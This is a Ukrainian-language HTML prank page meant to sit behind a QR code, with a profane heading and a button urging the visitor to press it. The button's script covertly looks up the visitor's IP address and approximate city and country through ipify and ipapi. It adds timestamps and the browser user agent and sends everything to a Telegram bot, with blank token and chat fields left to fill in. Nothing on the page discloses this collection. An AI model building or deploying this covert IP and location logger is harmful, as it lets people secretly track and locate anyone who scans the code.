<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>QR-сайт</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #2c003e, #000000);
            color: #fff;
            text-align: center;
        }

        h1 {
            font-size: 26px;
            margin: 0 20px 30px 20px;
            background: linear-gradient(90deg, #ff00ff, #9b00ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: glow 2s infinite alternate;
            word-break: break-word;
        }

        @keyframes glow {
            0% { text-shadow: 0 0 5px #ff00ff, 0 0 10px #9b00ff; }
            100% { text-shadow: 0 0 20px #ff00ff, 0 0 40px #9b00ff; }
        }

        button {
            padding: 15px 30px;
            font-size: 22px;
            border: 2px solid #9b00ff;
            border-radius: 12px;
            background: transparent;
            color: #fff;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
            max-width: 90%;
        }

        button:hover {
            background: #9b00ff;
            box-shadow: 0 0 15px #9b00ff;
            transform: scale(1.05);
        }

        .tg-link {
            margin-top: 40px;
            text-decoration: none;
            color: #fff;
            display: none;
            align-items: center;
            gap: 12px;
            font-size: 22px;
            padding: 10px 20px;
            border: 2px solid #9b00ff;
            border-radius: 12px;
            transition: all 0.3s ease;
            max-width: 90%;
            word-break: break-word;
        }

        .tg-link img {
            width: 36px;
            height: 36px;
        }

        .tg-link:hover {
            background: #9b00ff;
            transform: scale(1.05);
            box-shadow: 0 0 15px #9b00ff;
        }

        @media (min-width: 600px) {
            h1 { font-size: 40px; }
            .tg-link { font-size: 26px; gap: 15px; }
            .tg-link img { width: 44px; height: 44px; }
            button { font-size: 26px; padding: 20px 40px; }
        }
    </style>
</head>
<body>

<h1>Ну і нахуя ти сканіруєш QR?</h1>

<button onclick="sendTelegram()">Ну раз зайшов(шла) сюда, нажми уже!</button>

<a class="tg-link" id="tgLink" href="https://t.me/H00evat0" target="_blank">
    <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" />
    @H00evat0
</a>

<script>
async function sendTelegram() {
    const TOKEN = '';
    const CHAT_ID = '';

    const now = new Date();
    const timestampLocal = now.toLocaleString();
    const timestampUTC = now.toUTCString();
    const userAgent = navigator.userAgent;

    let ip = 'не визначено';
    try {
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipResponse.json();
        ip = ipData.ip || ip;
    } catch (e) {
        console.warn('Не вдалось отримати IP:', e);
    }

    let location = 'не визначено';
    try {
        if (ip !== 'не визначено') {
            const locResponse = await fetch(`https://ipapi.co/${ip}/json/`);
            const locData = await locResponse.json();
            if (locData.city && locData.region && locData.country_name) {
                location = `${locData.city}, ${locData.region}, ${locData.country_name}`;
            } else if (locData.region && locData.country_name) {
                location = `${locData.region}, ${locData.country_name}`;
            } else if (locData.country_name) {
                location = locData.country_name;
            }
        }
    } catch (e) {
        console.warn('Не вдалось отримати локацію:', e);
    }

    const message = `📢 *Натиснули кнопку на сайті!*\n\n` +
                    `🕒 Локальний час: ${timestampLocal}\n` +
                    `🕒 UTC час: ${timestampUTC}\n` +
                    `🌐 IP: ${ip}\n` +
                    `📍 Локація: ${location}\n` +
                    `🖥️ Браузер/пристрій: ${userAgent}`;

    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' }),
        });
        document.getElementById('tgLink').style.display = 'flex';
    } catch (err) {
        alert('Помилка: ' + err);
    }
}
</script>

</body>
</html>
